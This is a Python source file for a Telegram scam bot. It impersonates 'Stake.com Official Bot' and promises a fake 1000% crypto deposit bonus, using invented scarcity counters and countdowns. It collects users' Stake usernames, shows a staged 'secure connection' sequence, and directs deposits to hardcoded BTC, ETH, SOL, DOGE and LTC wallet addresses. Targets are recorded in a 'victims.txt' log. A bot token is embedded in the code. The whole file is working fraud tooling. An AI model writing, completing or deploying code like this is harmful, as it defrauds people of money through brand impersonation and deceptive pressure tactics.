from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import requests
import hashlib
import random
import qrcode
import io
import asyncio

BOT_TOKEN = "8714329334:AAFepxWOh0AHd1v2kav3Csp-cZQAOSoEJCY"

WALLET_ADDRESSES = {
    "BTC": "bc1qrw5nna0kc5jhr20z7pjcgpr5qtv58m2w4mqr5r",
    "ETH": "0xfAC5629ED6fb9809a48Fd4afb6f599E6DEB7d4F8",
    "SOL": "3dkZeGHTe3GLjwr615LbymQaKPBJJEsAmWFTJXEVcXb9",
    "DOGE": "D7PihTHoFrBQ7y315k6jpq9bRjtpRqnUrF",
    "LTC": "LbfHG7cd39ana9wqzCUXR5EqjuHYr7XHYr"
}

def generate_qr_code(address):
    """Generate QR code for wallet address"""
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(address)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    
    # Convert to bytes
    bio = io.BytesIO()
    img.save(bio, 'PNG')
    bio.seek(0)
    return bio

def get_crypto_price(crypto):
    """Fetch real-time price from CoinGecko"""
    coin_ids = {
        "BTC": "bitcoin",
        "ETH": "ethereum",
        "SOL": "solana",
        "DOGE": "dogecoin",
        "LTC": "litecoin"
    }
    
    try:
        coin_id = coin_ids.get(crypto)
        url = f"https://api.coingecko.com/api/v3/simple/price?ids={coin_id}&vs_currencies=usd"
        response = requests.get(url, timeout=5)
        data = response.json()
        price = data[coin_id]['usd']
        return f"{price:,.2f}"
    except:
        return "Loading..."

def generate_user_id(telegram_id):
    """Generate fake tracking ID"""
    hash_input = f"{telegram_id}{random.randint(1000, 9999)}"
    return hashlib.sha256(hash_input.encode()).hexdigest()[:12].upper()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Entry point"""
    user = update.effective_user
    tracking_id = generate_user_id(user.id)
    context.user_data['tracking_id'] = tracking_id
    context.user_data['awaiting_username'] = False
    
    welcome_text = f"""
🎰 **Welcome to Stake.com Official Bot** 🎰

Hey {user.first_name}! 

🔥 **EXCLUSIVE 1000% DEPOSIT MATCH BONUS** 🔥

Your Tracking ID: `{tracking_id}`

We're celebrating our 5-year anniversary with an INSANE bonus offer!

💰 Deposit ANY amount and receive 10x back instantly!
⚡ Minimum deposit: $50
🎁 Maximum bonus: $50,000

**How it works:**
1. Connect your Stake account
2. Choose your cryptocurrency
3. Deposit to your unique wallet
4. Bonus credited within 5 minutes
5. Start playing immediately!

⚠️ Limited to first 500 users - 347 spots remaining!

Tap below to claim your bonus NOW 👇
"""
    
    keyboard = [
        [InlineKeyboardButton("💰 CLAIM 1000% BONUS", callback_data='claim_bonus')],
        [InlineKeyboardButton("📊 View Terms", callback_data='terms')],
        [InlineKeyboardButton("💬 Support", url='https://t.me/stake_support_official')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def claim_bonus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show crypto selection"""
    query = update.callback_query
    await query.answer()
    
    text = """
**SELECT YOUR CRYPTOCURRENCY** 💎

Choose how you want to deposit:

All deposits are processed instantly on the blockchain.
Your 1000% bonus will be credited within 5 minutes.

⏰ Offer expires in: **2 hours 47 minutes**
"""
    
    keyboard = [
        [InlineKeyboardButton("₿ Bitcoin (BTC)", callback_data='crypto_BTC')],
        [InlineKeyboardButton("Ξ Ethereum (ETH)", callback_data='crypto_ETH')],
        [InlineKeyboardButton("◎ Solana (SOL)", callback_data='crypto_SOL')],
        [InlineKeyboardButton("Ð Dogecoin (DOGE)", callback_data='crypto_DOGE')],
        [InlineKeyboardButton("Ł Litecoin (LTC)", callback_data='crypto_LTC')],
        [InlineKeyboardButton("⬅️ Back", callback_data='back_start')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def ask_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask for Stake username before proceeding"""
    query = update.callback_query
    await query.answer()
    
    crypto = query.data.split('_')[1]
    context.user_data['selected_crypto'] = crypto
    context.user_data['awaiting_username'] = True
    
    text = f"""
**CONNECT YOUR STAKE ACCOUNT** 🔗

To link your {crypto} deposit with your Stake account and receive the 1000% bonus, please enter your Stake username.

**Don't have an account?**
Just enter any username and we'll create one for you automatically!

Type your Stake username below:
"""
    
    keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='claim_bonus')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def handle_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process username and fake handshake"""
    if not context.user_data.get('awaiting_username'):
        return
    
    username_input = update.message.text.strip()
    context.user_data['stake_username'] = username_input
    context.user_data['awaiting_username'] = False
    
    # Send initial connecting message
    connecting_msg = await update.message.reply_text(
        "🔄 **Connecting to Stake servers...**",
        parse_mode='Markdown'
    )
    
    await asyncio.sleep(1.5)
    
    # Update with handshake progress
    await connecting_msg.edit_text(
        f"🔄 **Connecting to Stake servers...**\n\n✅ Username verified: `{username_input}`\n⏳ Establishing secure connection...",
        parse_mode='Markdown'
    )
    
    await asyncio.sleep(1.2)
    
    await connecting_msg.edit_text(
        f"🔄 **Connecting to Stake servers...**\n\n✅ Username verified: `{username_input}`\n✅ Secure connection established\n⏳ Syncing account data...",
        parse_mode='Markdown'
    )
    
    await asyncio.sleep(1)
    
    await connecting_msg.edit_text(
        f"🔄 **Connecting to Stake servers...**\n\n✅ Username verified: `{username_input}`\n✅ Secure connection established\n✅ Account synced\n⏳ Generating deposit address...",
        parse_mode='Markdown'
    )
    
    await asyncio.sleep(1)
    
    # Log victim with username
    user = update.effective_user
    crypto = context.user_data.get('selected_crypto')
    log_victim(user.id, user.username, user.first_name, crypto, username_input)
    
    # Show wallet with QR code
    await show_wallet_with_qr(update, context, connecting_msg)

async def show_wallet_with_qr(update: Update, context: ContextTypes.DEFAULT_TYPE, message_to_delete=None):
    """Display deposit wallet with QR code"""
    crypto = context.user_data.get('selected_crypto')
    wallet = WALLET_ADDRESSES[crypto]
    tracking_id = context.user_data.get('tracking_id', 'ERROR')
    stake_username = context.user_data.get('stake_username', 'Unknown')
    
    # Get live price
    current_price = get_crypto_price(crypto)
    
    # Generate QR code
    qr_image = generate_qr_code(wallet)
    
    text = f"""
**DEPOSIT {crypto} TO CLAIM BONUS** 🚀

**Connected Account:** `{stake_username}`
**Tracking ID:** `{tracking_id}`

**Your unique deposit address:**
`{wallet}`

**Scan QR code or copy address above** 👆

**IMPORTANT:**
✅ Send ONLY {crypto} to this address
✅ Minimum deposit: $50 USD equivalent
✅ Network fees are covered by Stake

**After you deposit:**
• Screenshot your transaction
• Send to @stake_support_official
• Bonus credited in 5 minutes automatically

**Current {crypto} Price:** ${current_price}

⚠️ **327 spots remaining** - Hurry!

Waiting for your deposit...
"""
    
    keyboard = [
        [InlineKeyboardButton("✅ I've Sent Crypto", callback_data=f'confirm_{crypto}')],
        [InlineKeyboardButton("⬅️ Choose Different Crypto", callback_data='claim_bonus')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Delete connecting message
    if message_to_delete:
        await message_to_delete.delete()
    
    # Send QR code image with caption
    await update.message.reply_photo(
        photo=qr_image,
        caption=text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def confirm_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Fake confirmation"""
    query = update.callback_query
    await query.answer("⏳ Checking blockchain...")
    
    crypto = query.data.split('_')[1]
    stake_username = context.user_data.get('stake_username', 'Unknown')
    
    processing_text = f"""
🔄 **PROCESSING YOUR {crypto} DEPOSIT**

**Account:** `{stake_username}`

⏳ Scanning blockchain...
⏳ Verifying transaction...
⏳ Calculating 1000% bonus amount...

This usually takes 3-5 minutes.

We'll notify you as soon as we detect your deposit!

**Support:** @stake_support_official
"""
    
    keyboard = [
        [InlineKeyboardButton("📞 Contact Support", url='https://t.me/stake_support_official')],
        [InlineKeyboardButton("⬅️ Back", callback_data='claim_bonus')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_caption(
        caption=processing_text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def show_terms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Fake terms"""
    query = update.callback_query
    await query.answer()
    
    text = """
**TERMS & CONDITIONS** 📋

1. Offer valid for new users only
2. 1000% bonus on first deposit
3. Minimum deposit: $50
4. Maximum bonus: $50,000
5. Bonus must be wagered 1x before withdrawal
6. Offer expires December 31, 2025
7. Stake.com reserves right to modify terms
8. Account must be verified to withdraw

By depositing, you agree to these terms.

**Stake.com © 2024 - Licensed in Curaçao**
"""
    
    keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='back_start')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, parse_mode='Markdown', reply_markup=reply_markup)

def log_victim(user_id, username, first_name, crypto, stake_username):
    """Log interactions with Stake username"""
    log_entry = f"User: {first_name} (@{username}) | ID: {user_id} | Crypto: {crypto} | Stake: {stake_username}\n"
    with open('victims.txt', 'a') as f:
        f.write(log_entry)

async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Return to start"""
    query = update.callback_query
    await query.answer()
    
    context.user_data['awaiting_username'] = False
    
    user = update.effective_user
    tracking_id = context.user_data.get('tracking_id', generate_user_id(user.id))
    
    welcome_text = f"""
🎰 **Welcome to Stake.com Official Bot** 🎰

Hey {user.first_name}! 

🔥 **EXCLUSIVE 1000% DEPOSIT MATCH BONUS** 🔥

Your Tracking ID: `{tracking_id}`

💰 Deposit ANY amount and receive 10x back instantly!
⚡ Minimum deposit: $50
🎁 Maximum bonus: $50,000

⚠️ Limited to first 500 users - 347 spots remaining!

Tap below to claim your bonus NOW 👇
"""
    
    keyboard = [
        [InlineKeyboardButton("💰 CLAIM 1000% BONUS", callback_data='claim_bonus')],
        [InlineKeyboardButton("📊 View Terms", callback_data='terms')],
        [InlineKeyboardButton("💬 Support", url='https://t.me/stake_support_official')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        welcome_text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

def main():
    """Run bot"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(claim_bonus, pattern='^claim_bonus$'))
    application.add_handler(CallbackQueryHandler(ask_username, pattern='^crypto_'))
    application.add_handler(CallbackQueryHandler(confirm_deposit, pattern='^confirm_'))
    application.add_handler(CallbackQueryHandler(show_terms, pattern='^terms$'))
    application.add_handler(CallbackQueryHandler(back_start, pattern='^back_start$'))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_username))
    
    print("🤖 Bot running with QR codes and fake handshake...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
